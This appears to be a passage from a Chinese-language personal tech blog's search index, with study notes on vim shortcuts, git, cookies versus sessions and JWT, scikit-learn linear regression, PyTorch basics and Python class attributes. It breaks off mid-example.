-&gt; 到本行最后一个不是blank字符的位置。/pattern -&gt; 搜索 pattern的字符串(如果搜索出多个匹配，可按n键到下一个 N键到上一个):e &lt;path/to/file&gt; -&gt; 打开一个文件.(小数点) -&gt; 可以重复上一次的命令* -&gt; 跳转至下一个与当前光标相同字符的位置(可以跨行跳转)# -&gt; 跳转至上一个与当前光标相同字符的位置(可以跨行跳转)% -&gt; 匹配括号移动，包括 (, {, [. (需要把光标先移到括号上){ -&gt; 按段移动,上移 } -&gt; 按段移动,下移D -&gt; 删除光标后本行所有内容,包含光标所在字符 d0 -&gt; 删除光标前本行所有内容,不包含光标所在字符dw -&gt; 删除光标开始位置的字,包含光标所在字符&gt;&gt; -&gt; 文本行右移 &lt;&lt; -&gt; 文本行左移r -&gt; 替换当前字符 R -&gt; 替换当前行光标后的字符:%s/abc/123/g  -&gt; 末行模式下，将当前文件中的所有abc替换成123:1, 10s/abc/123/g  -&gt; 末行模式下，将第一行至第10行之间的abc替换成123</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/git</title>
      <link href="java/git/"/>
      <url>java/git/</url>
      
        <content type="html"><![CDATA[<a id="more"></a> <h2 id="使用git上传-会因为-参数长度过长而导致-无法上传"><a href="#使用git上传-会因为-参数长度过长而导致-无法上传" class="headerlink" title="使用git上传 会因为 参数长度过长而导致 无法上传"></a>使用git上传 会因为 参数长度过长而导致 无法上传</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Cookie</title>
      <link href="java/Cookie/"/>
      <url>java/Cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><a id="more"></a><h2 id="Session-、Cooike、Token"><a href="#Session-、Cooike、Token" class="headerlink" title="Session 、Cooike、Token"></a>Session 、Cooike、Token</h2><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>服务器请求服务端，服务端会为这次请求开辟一块<strong>内存空间</strong>，这个对象便是Session对象，存储结构为ConcurrentHashMap ， Session弥补了HTTP无状态特性， 服务器可以利用Session存储客户端在同一个会话期间的一些操作记录</p><h4 id="Session如何判断是否是同一会话"><a href="#Session如何判断是否是同一会话" class="headerlink" title="Session如何判断是否是同一会话"></a>Session如何判断是否是同一会话</h4><p>服务器生成Session对象时同生成了一个sessionId，并通过响应头的Set-Cookie ： JESSIONID=XXXXX命令 ，向客户端发送要求设置Cookie 的相应 ；客户端收到响应后，在本机客户端设置了要给JESSIONID=XXXXX的Cookie 信息，该Cookie的过期时间为浏览器会话结束</p><p><img src="../images/Cookie/image-20210528153022821.png" alt="image-20210528153022821"></p><p>接下来客户端每次向同一个网站发送请求时请求头都会带上该Cookie信息（包含sessionId），然后，服务器通过读取请求头中的Cookie信息，获取名称为JESSIONID的值，得到此次请求的sessionId。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>Session 机制有个缺点，比如 A 服务器存储了 Session，就是做了负载均衡后，假如一段时间内 A 的访问量激增，会转发到 B 进行访问，但是 B 服务器并没有存储 A 的 Session，会导致 Session 的失效。</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>HTTP 协议中的 Cookie 包括 <code>Web Cookie</code> 和<code>浏览器 Cookie</code>，它是服务器发送到 Web 浏览器的一小块数据。服务器发送到浏览器的 Cookie，浏览器会进行存储，并与下一个请求一起发送到服务器。通常，它用于判断两个请求是否来自于同一个浏览器，例如用户保持登录状态。</p><blockquote><p>HTTP Cookie 机制是 HTTP 协议无状态的一种补充和改良</p></blockquote><p>三个用途</p><ul><li>会话管理</li></ul><p>登陆、购物车、游戏得分或者服务器应该记住的其它内容</p><ul><li>个性化</li></ul><p>用户偏好、主题或者其它设置</p><ul><li>追踪</li></ul><p>记录和分析用户行为</p><p>Cookie 曾经用于一般的客户端存储。虽然这是合法的，因为它们是在客户端上存储数据的唯一方法，但如今建议使用现代存储 API。Cookie 随每个请求一起发送，因此它们可能会降低性能（尤其是对于移动数据连接而言）。</p><h4 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h4><p>当接收到客户端发出的 HTTP 请求时，服务器可以发送带有响应的 <code>Set-Cookie</code> 标头，Cookie 通常由浏览器存储，然后将 Cookie 与 HTTP 标头一同向服务器发出请求。</p><p> <code>Set-cookie</code> 标头告诉客户端存储Cookie </p><p>现在，随着对服务器的每个新请求，浏览器将使用 Cookie 头将所有以前存储的 Cookie 发送回服务器。</p><p>有两种类型的 Cookies，一种是 Session Cookies，一种是 Persistent Cookies，如果 Cookie 不包含到期日期，则将其视为会话 Cookie。会话 Cookie 存储在内存中，永远不会写入磁盘，当浏览器关闭时，此后 Cookie 将永久丢失。如果 Cookie 包含<code>有效期</code> ，则将其视为持久性 Cookie。在到期指定的日期，Cookie 将从磁盘中删除。</p><p>还有一种是 <code>Cookie的 Secure 和 HttpOnly 标记</code>，下面依次来介绍一下</p><h4 id="会话Cookies"><a href="#会话Cookies" class="headerlink" title="会话Cookies"></a>会话Cookies</h4><p>上面的示例创建的是会话 Cookie ，会话 Cookie 有个特征，客户端关闭时 Cookie 会删除，因为它没有指定<code>Expires</code>或 <code>Max-Age</code> 指令。</p><p>但是，Web 浏览器可能会使用会话还原，这会使大多数会话 Cookie 保持永久状态，就像从未关闭过浏览器一样。</p><h4 id="永久性-Cookies"><a href="#永久性-Cookies" class="headerlink" title="永久性 Cookies"></a>永久性 Cookies</h4><p>永久性 Cookie 不会在客户端关闭时过期，而是在<code>特定日期（Expires）</code>或<code>特定时间长度（Max-Age）</code>外过期。例如</p><h4 id="Cookie-的Secure-和HttpOnly标记"><a href="#Cookie-的Secure-和HttpOnly标记" class="headerlink" title="Cookie 的Secure 和HttpOnly标记"></a>Cookie 的Secure 和HttpOnly标记</h4><p>安全的 Cookie 需要经过 HTTPS 协议通过加密的方式发送到服务器。即使是安全的，也不应该将敏感信息存储在cookie 中，因为它们本质上是不安全的，并且此标志不能提供真正的保护。</p><p><strong>HttpOnly 的作用</strong></p><ul><li>会话 Cookie 中缺少 HttpOnly 属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的 Cookie 信息，造成用户 Cookie 信息泄露，增加攻击者的跨站脚本攻击威胁。</li><li>HttpOnly 是微软对 Cookie 做的扩展，该值指定 Cookie 是否可通过客户端脚本访问。</li><li>如果在 Cookie 中没有设置 HttpOnly 属性为 true，可能导致 Cookie 被窃取。窃取的 Cookie 可以包含标识站点用户的敏感信息，如 ASP.NET 会话 ID 或 Forms 身份验证票证，攻击者可以重播窃取的 Cookie，以便伪装成用户或获取敏感信息，进行跨站脚本攻击等。</li></ul><h4 id="Cookie的作用域"><a href="#Cookie的作用域" class="headerlink" title="Cookie的作用域"></a>Cookie的作用域</h4><p>Domain 和 Path 标识定义了Cookie 的作用域：即Cookie应该发送给哪些URL</p><p><code>Domain</code> 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前主机(<strong>不包含子域名</strong>）。如果指定了<code>Domain</code>，则一般包含子域名。</p><p>例如，如果设置 <code>Domain=mozilla.org</code>，则 Cookie 也包含在子域名中（如<code>developer.mozilla.org</code>）。</p><p>例如，设置 <code>Path=/docs</code>，则以下地址都会匹配：</p><ul><li><code>/docs</code></li><li><code>/docs/Web/</code></li><li><code>/docs/Web/HTTP</code></li></ul><h3 id="JSON-Web-Token-和Session-Cookies-的对比"><a href="#JSON-Web-Token-和Session-Cookies-的对比" class="headerlink" title="JSON Web Token 和Session Cookies 的对比"></a>JSON Web Token 和Session Cookies 的对比</h3><hr><p><code>JSON Web Token ，简称 JWT</code>，它和 <code>Session</code>都可以为网站提供用户的身份认证，但是它们不是一回事。</p><h4 id="JWT-和Session-Cookies的相同点"><a href="#JWT-和Session-Cookies的相同点" class="headerlink" title="JWT 和Session Cookies的相同点"></a>JWT 和Session Cookies的相同点</h4><p>它们既可以对用户进行身份验证，也可以用来在用户单击进入不同页面时以及登陆网站或应用程序后进行身份验证。</p><p>如果没有这两者，那你可能需要在每个页面切换时都需要进行登录了。因为 HTTP 是一个无状态的协议。这也就意味着当你访问某个网页，然后单击同一站点上的另一个页面时，服务器的<code>内存中</code>将不会记住你之前的操作。</p><p><img src="../images/Cookie/image-20210528181708977.png" alt="image-20210528181708977"></p><p><strong>JWT 和 Session Cookies 就是用来处理在不同页面之间切换，保存用户登录信息的机制</strong>。</p><p>也就是说，这两种技术都是用来保存你的登录状态，能够让你在浏览任意受密码保护的网站。通过在每次产生新的请求时对用户数据进行身份验证来解决此问题。</p><p>所以 JWT 和 Session Cookies 的相同之处是什么？那就是它们能够支持你在发送不同请求之间，记录并验证你的登录状态的一种机制。</p><h3 id="Session-Cookies"><a href="#Session-Cookies" class="headerlink" title="Session Cookies"></a>Session Cookies</h3><p>Session Cookies 也称为<code>会话 Cookies</code>，在 Session Cookies 中，用户的登录状态会保存在<code>服务器</code>的<code>内存</code>中。当用户登录时，Session 就被服务端安全的创建。</p><p>在每次请求时，服务器都会从会话 Cookie 中读取 SessionId，如果服务端的数据和读取的 SessionId 相同，那么服务器就会发送响应给浏览器，允许用户登录。</p><p><img src="../images/Cookie/image-20210528181829190.png" alt="image-20210528181829190"></p><h4 id="Json-Web-Tokens"><a href="#Json-Web-Tokens" class="headerlink" title="Json Web Tokens"></a>Json Web Tokens</h4><p>Json Web Token 的简称就是 JWT，通常可以称为 <code>Json 令牌</code>。它是<code>RFC 7519</code> 中定义的用于<code>安全的</code>将信息作为 <code>Json 对象</code>进行传输的一种形式。JWT 中存储的信息是经过<code>数字签名</code>的，因此可以被信任和理解。可以使用 HMAC 算法或使用 RSA/ECDSA 的公用/专用密钥对 JWT 进行签名。</p><p>使用 JWT 主要用来下面两点</p><ul><li><code>认证(Authorization)</code>：这是使用 JWT 最常见的一种情况，一旦用户登录，后面每个请求都会包含 JWT，从而允许用户访问该令牌所允许的路由、服务和资源。<code>单点登录</code>是当今广泛使用 JWT 的一项功能，因为它的开销很小。</li><li><code>信息交换(Information Exchange)</code>：JWT 是能够安全传输信息的一种方式。通过使用公钥/私钥对 JWT 进行签名认证。此外，由于签名是使用 <code>head</code> 和 <code>payload</code> 计算的，因此你还可以验证内容是否遭到篡改。</li></ul><h5 id="JWT-的格式"><a href="#JWT-的格式" class="headerlink" title="JWT 的格式"></a>JWT 的格式</h5><p>JWT 主要由三部分组成，每个部分用 <code>.</code> 进行分割，各个部分分别是</p><ul><li><code>Header</code></li><li><code>Payload</code></li><li><code>Signature</code></li></ul><p>一个简单的JWT</p><p><img src="../images/Cookie/image-20210528182014151.png" alt="image-20210528182014151"></p><p><strong>Header</strong></p><p> Header 是 JWT 的标头，它通常由两部分组成：<code>令牌的类型(即 JWT)</code>和使用的 <code>签名算法</code>，例如 HMAC SHA256 或 RSA。</p><p>例如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line"><span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*<em>Payload *</em></p><p>Token 的第二部分是 <code>Payload</code>，Payload 中包含一个声明。声明是有关实体（通常是用户）和其他数据的声明。共有三种类型的声明：<strong>registered, public 和 private</strong> 声明。</p><ul><li><code>registered 声明</code>：包含一组建议使用的预定义声明，主要包括</li></ul><p><img src="../images/Cookie/640" alt="图片"></p><ul><li><code>public 声明</code>：公共的声明，可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息，但不建议添加敏感信息，因为该部分在客户端可解密。</li><li><code>private 声明</code>：自定义声明，旨在在同意使用它们的各方之间共享信息，既不是注册声明也不是公共声明。</li></ul><p>例如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line"><span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line"><span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后payload Json 块会被<code>Base64Url</code> 编码形成JWT 的第二部分 </p><p><strong>signature</strong></p><p>JWT 的第三部分是一个签证信息， 这个签证信息由三部分组成 </p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret</li></ul><p>比如我们需要 HMAC SHA256 算法进行签名</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(<span class="name">header</span>) + <span class="string">"."</span> +</span><br><span class="line">  base64UrlEncode(<span class="name">payload</span>),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>签名用于验证消息在此过程中没有更改，并且对于使用私钥进行签名的令牌，它还可以验证 JWT 的发送者的真实身份</p><p>最后就是将三个由点分隔的Base64-URL 字符串部分组成在一起，这个字符串可以在HTML 和 HTTP 环境中轻松传递这些字符串</p><p><img src="../images/Cookie/image-20210528193223267.png" alt="image-20210528193223267"></p><h3 id="JWT-和-Session-Cookies-的不同"><a href="#JWT-和-Session-Cookies-的不同" class="headerlink" title="JWT 和 Session Cookies 的不同"></a>JWT 和 Session Cookies 的不同</h3><h4 id="密码签名"><a href="#密码签名" class="headerlink" title="密码签名"></a>密码签名</h4><p>jwt 有加密签名， 而Session Cookies 则没有 </p><h4 id="jwt是无状态的"><a href="#jwt是无状态的" class="headerlink" title="jwt是无状态的"></a>jwt是无状态的</h4><p>JWT 是<code>无状态</code>的，因为声明被存储在<code>客户端</code>，而不是服务端内存中。</p><p>身份验证可以在<code>本地</code>进行，而不是在请求必须通过服务器数据库或类似位置中进行。这意味着可以对用户进行多次身份验证，而无需与站点或应用程序的数据库进行通信，也无需在此过程中消耗大量资源。</p><h4 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h4><p>Session Cookies 是存储在服务器内存中，这就意味着如果网站或者应用很大的情况下会耗费大量的资源。由于 JWT 是无状态的，在许多情况下，它们可以节省服务器资源。因此 JWT 要比 Session Cookies 具有更强的<code>可扩展性</code>。</p><h4 id="jwt支持跨域"><a href="#jwt支持跨域" class="headerlink" title="jwt支持跨域"></a>jwt支持跨域</h4><p>Session Cookies 只能用在<code>单个节点的域</code>或者它的<code>子域</code>中有效。如果它们尝试通过第三个节点访问，就会被禁止。如果你希望自己的网站和其他站点建立安全连接时，这是一个问题。</p><p>使用 JWT 可以解决这个问题，使用 JWT 能够通过<code>多个节点</code>进行用户认证，也就是我们常说的<code>跨域认证</code>。</p><h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><p>大致来说</p><p>对于只需要登录用户并访问存储在站点数据库中的一些信息的中小型网站来说，Session Cookies 通常就能满足。</p><p>如果你有企业级站点，应用程序或附近的站点，并且需要处理大量的请求，尤其是第三方或很多第三方（包括位于不同域的API），则 JWT 显然更适合。</p><h4 id="禁用Cookies-，-如何使用Session"><a href="#禁用Cookies-，-如何使用Session" class="headerlink" title="禁用Cookies ， 如何使用Session"></a>禁用Cookies ， 如何使用Session</h4><ul><li>如果禁用了 Cookies，服务器仍会将 sessionId 以 cookie 的方式发送给浏览器，但是，浏览器不再保存这个cookie (即sessionId) 了。</li><li>如果想要继续使用 session，需要采用 <code>URL 重写</code> 的方式来实现，可以参考 <a href="https://www.cnblogs.com/Renyi-Fan/p/11012086.html" target="_blank" rel="noopener">https://www.cnblogs.com/Renyi-Fan/p/11012086.html</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/sklearn</title>
      <link href="python/sklearn/"/>
      <url>python/sklearn/</url>
      
        <content type="html"><![CDATA[<h1 id="sk-learn"><a href="#sk-learn" class="headerlink" title="sk-learn"></a>sk-learn</h1><a id="more"></a><p>简介 </p><p>scikit-learn是基于Python 语言的机器学习工具</p><ul><li>简单高效的数据挖掘和数据分析工具</li><li>可供大家在各种环境中重复使用</li><li>建立在 NumPy ，SciPy 和 matplotlib 上</li><li>开源，可商业使用 - BSD许可证</li></ul><h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p>fit方法可以用来完成线性模型中的拟合，coef_成员一般用来存储模型系数 </p><h3 id="广义线性模型"><a href="#广义线性模型" class="headerlink" title="广义线性模型"></a>广义线性模型</h3><p>本章主要讲述一些用于回归的方法，其中目标值 y 是输入变量 x 的线性组合。 数学概念表示为：如果 <img src="../images/sklearn/047826f1c2e6f2687b304cb5217be8d8.jpg" alt="\hat{y}"> 是预测值，那么有：</p><p><img src="../images/sklearn/4ee9f6c666393981b6458e54c3ec89d0.jpg" alt="\hat{y}(w, x) = w_0 + w_1 x_1 + ... + w_p x_p"></p><p>在整个模块中，我们定义向量 <img src="../images/sklearn/b003858334d1ad594207911e84219151.jpg" alt="w = (w_1,..., w_p)"> 作为 <code>coef_</code> ，定义 <img src="../images/sklearn/57e15e43b846791e47a202e1a9a5d8ce.jpg" alt="w_0"> 作为 <code>intercept_</code> 。</p><h4 id="普通最小二乘法"><a href="#普通最小二乘法" class="headerlink" title="普通最小二乘法"></a>普通最小二乘法</h4><p>LinearRegression 拟合一个带有系数 w = （w1,……,wp）的线性模型</p><p>使得实际观测数据和预测数据（估计值）之间的残差平方和最小</p><p><img src="../images/sklearn/1b6228a71a038f66ac7b8a2743adf4e7.jpg" alt="\underset{w}{min\,} {|| X w - y||_2}^2"></p><p>数学表达式 min(w)||Xw-y||2²</p><p>LinearRegression 会调用fit方法来你和数组X，y，并且将线性模型的系数w存储在其成员变量</p><p>coef_中：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line">&gt;&gt;&gt; reg = linear_model.LinearRegression()</span><br><span class="line">&gt;&gt;&gt; reg.fit ([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2</span>]], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">LinearRegression(copy_X=True, fit_intercept=True, n_jobs=<span class="number">1</span>, normalize=False)</span><br><span class="line">&gt;&gt;&gt; reg.coef_</span><br><span class="line"><span class="built_in">array</span>([ <span class="number">0.5</span>,  <span class="number">0.5</span>])</span><br></pre></td></tr></table></figure><p>特性导致最小二乘估计对于随机误差非常敏感，可能产生很大的方差，在没有实验设计的情况下收集到的数据，这种多重共线性(mylticollinearity)的情况可能真的会出现 </p><h4 id="普通最小二乘法的复杂度"><a href="#普通最小二乘法的复杂度" class="headerlink" title="普通最小二乘法的复杂度"></a>普通最小二乘法的复杂度</h4><p>如果 X 是一个形状为 <code>(n_samples, n_features)</code>的矩阵，设$$n_{samples} \geq n_{features}$$, 则该方法的复杂度为$$O(n_{samples} n_{fearures}^2)$$</p><h3 id="线性和二次判别分析"><a href="#线性和二次判别分析" class="headerlink" title="线性和二次判别分析"></a>线性和二次判别分析</h3><p>该方法使用 X 的奇异值分解来计算最小二乘解。如果 X 是一个形状为 <code>(n_samples, n_features)</code>的矩阵，设 n_{samples} \geq n_{features}<em>n<strong>s</strong>a<strong>m</strong>p<strong>l</strong>e<strong>s<em>≥</em>n</strong>f<strong>e</strong>a<strong>t</strong>u<strong>r</strong>e**s</em> , 则该方法的复杂度为 O(n_{samples} n_{fearures}^2)<em>O</em>(<em>n*</em>s<strong>a</strong>m<strong>p</strong>l<strong>e</strong>s<strong>n</strong>f<strong>e</strong>a<strong>r</strong>u<strong>r</strong>e*<em>s</em>2)</p><h3 id="内核岭回归"><a href="#内核岭回归" class="headerlink" title="内核岭回归"></a>内核岭回归</h3><p><a href="https://scikit-learn.org/stable/modules/generated/sklearn.linear_model.Ridge.html#sklearn.linear_model.Ridge" target="_blank" rel="noopener"><code>Ridge</code></a> 回归通过对系数的大小施加惩罚来解决 <a href="https://sklearn.apachecn.org/docs/master/2.html#1111-普通最小二乘法复杂度" target="_blank" rel="noopener">普通最小二乘法</a> 的一些问题。 岭系数最小化的是带罚项的残差平方和，</p><p>)<img src="../images/sklearn/image-20201113215106217.png" alt="image-20201113215106217">)其中，<img src="../images/sklearn/image-20201113215127267.png" alt="image-20201113215127267">控制系数收缩量的复杂性参数： 的值越大，收缩量越大，模型对共线性的鲁棒性也更强。</p><h3 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h3><h2 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h2><h2 id="模型选择和评估"><a href="#模型选择和评估" class="headerlink" title="模型选择和评估"></a>模型选择和评估</h2><h2 id="数据集转换"><a href="#数据集转换" class="headerlink" title="数据集转换"></a>数据集转换</h2><h2 id="数据集加载工具"><a href="#数据集加载工具" class="headerlink" title="数据集加载工具"></a>数据集加载工具</h2><h2 id="使用scikit-learn计算"><a href="#使用scikit-learn计算" class="headerlink" title="使用scikit-learn计算"></a>使用scikit-learn计算</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/pytorch</title>
      <link href="python/pytorch/"/>
      <url>python/pytorch/</url>
      
        <content type="html"><![CDATA[<h1 id="pytorch学习"><a href="#pytorch学习" class="headerlink" title="pytorch学习"></a>pytorch学习</h1><a id="more"></a><p>包torch包含了多维张量的数据结构以及基于其上的多种数学操作。另外，它也提供了多种工具，其中一些可以更有效地对张量和任意类型进行序列化</p><h2 id="图片数据建模流程范例"><a href="#图片数据建模流程范例" class="headerlink" title="图片数据建模流程范例"></a>图片数据建模流程范例</h2><h3 id="1，准备数据"><a href="#1，准备数据" class="headerlink" title="1，准备数据"></a>1，准备数据</h3><p>cifar2数据集只包括前两种cifar10数据集类别airplane和automobile</p><p>在Pytorch中构建图片数据管道通常有三种方法。</p><p>第一种是使用 torchvision中的datasets.ImageFolder来读取图片然后用 DataLoader来并行加载。</p><p>第二种是通过继承 torch.utils.data.Dataset 实现用户自定义读取逻辑然后用 DataLoader来并行加载。</p><p>第三种方法是读取用户自定义数据集的通用方法，既可以读取图片数据集，也可以读取文本数据集。</p><h2 id="基础流畅和操作"><a href="#基础流畅和操作" class="headerlink" title="基础流畅和操作"></a>基础流畅和操作</h2><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p><strong>作用</strong> ：通过激活函数，网络结构学到了非线性特征，而不使用激活函数，只能得到学到线性特征。</p><p>其中torch 包中</p><p>各个<a href="https://blog.csdn.net/dss_dssssd/article/details/83927312" target="_blank" rel="noopener">激活函数的讲解</a></p><h3 id="Autograd（自动求导机制）"><a href="#Autograd（自动求导机制）" class="headerlink" title="Autograd（自动求导机制）"></a>Autograd（自动求导机制）</h3><p><code>torch.Tensor</code>是这个包的核心类。如果设置 <code>.requires_grad</code> 为 <code>True</code>，那么将会追踪所有对于该张量的操作。 当完成计算后通过调用 <code>.backward()</code>，自动计算所有的梯度， 这个张量的所有梯度将会自动积累到 <code>.grad</code> 属性。</p><p>张量的request_grad属性值没有指定的话，会默认为false</p><h3 id="optimizer-优化器"><a href="#optimizer-优化器" class="headerlink" title="optimizer 优化器"></a>optimizer 优化器</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loss.backward()  <span class="comment">#反向梯度</span></span><br><span class="line">optimizer_G.step() 进行参数更新值的传递 更新optimizer中作用对象parameters</span><br><span class="line"><span class="attr">optimizer</span> = torch.optim.SGD(net.parameters(), <span class="attr">lr=0.2)</span>  <span class="comment"># 传入net的所有参数，学习率</span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimizer.zero_grad() #梯度置<span class="number">0</span>，吧loss关于weight的导数变为<span class="number">0</span></span><br></pre></td></tr></table></figure><p>使用optimizer时每个batch 一般有的操作</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zero the parameter gradients</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        <span class="comment"># forward + backward + optimize</span></span><br><span class="line">        <span class="attr">outputs</span> = net(inputs)</span><br><span class="line">        <span class="attr">loss</span> = criterion(outputs, labels)</span><br><span class="line">        loss.backward()</span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure><p>可以参考理解成为一种梯度下降法</p><h4 id="lr"><a href="#lr" class="headerlink" title="lr"></a>lr</h4><p><a href="https://blog.csdn.net/qq_37764129/article/details/101522154?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">参考</a></p><p>lr即stride（步长），即反向传播算法中的η <img src="../images/pytorch/2019092711442454.png" alt="img"></p><p>学习率的大小</p><table><thead><tr><th></th><th>学习率 大</th><th>学习率 小</th></tr></thead><tbody><tr><td>学习速度</td><td>快</td><td>慢</td></tr><tr><td>使用时间点</td><td>刚开始训练时</td><td>一定轮数过后</td></tr><tr><td>副作用</td><td>1.易损失值爆炸；2.易振荡。</td><td>1.易过拟合；2.收敛速度慢。</td></tr></tbody></table><p>在训练过程中，一般根据训练轮数设置动态变化的学习率。</p><p>刚开始训练时：学习率以 0.01 ~ 0.001 为宜。<br>一定轮数过后：逐渐减缓。<br>接近训练结束：学习速率的衰减应该在100倍以上。</p><p><strong>Note：</strong><br>如果是 <strong>迁移学习</strong> ，由于模型已在原始数据上收敛，此时应设置较小学习率 (≤10−4≤10−4) 在新数据上进行 <strong>微调</strong> 。</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><h4 id="MSELoss"><a href="#MSELoss" class="headerlink" title="MSELoss()"></a>MSELoss()</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">loss_func</span> = torch.nn.MSELoss()   <span class="comment">#建立损失函数对象</span></span><br><span class="line"><span class="attr">loss</span> = loss_func(prediction, y)  <span class="comment">#计算两个数据集的误差</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/python</title>
      <link href="python/python/"/>
      <url>python/python/</url>
      
        <content type="html"><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="实例属性和类属性"><a href="#实例属性和类属性" class="headerlink" title="实例属性和类属性"></a>实例属性和类属性</h4><p>给实例绑定属性的方法是通过实例对象，或者通过self变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">self.name =  name</span><br><span class="line"></span><br><span class="line">s = Studen(<span class="string">"Bob"</span>)</span><br><span class="line">s.score = <span class="number">90</span> <span class="comment">#可以说对象s绑定乐score属性</span></span><br></pre></td></tr></table></figure><p>如果Student 类本书需要绑定一个属性可以直接在class中定义属性，这种属性是类属性，归Student所有</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class Stident(obiect):</span></span><br><span class="line"><span class="comment">#name = "Student"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="title">object</span>):</span></span><br><span class="line">...     name =  <span class="string">"Student"</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s  = Student()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.name</span><br><span class="line"><span class="string">'Student'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.name = <span class="string">"Michael"</span> <span class="comment"># 给实例绑定name属性</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.name</span><br><span class="line"><span class="string">'Michael'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;del 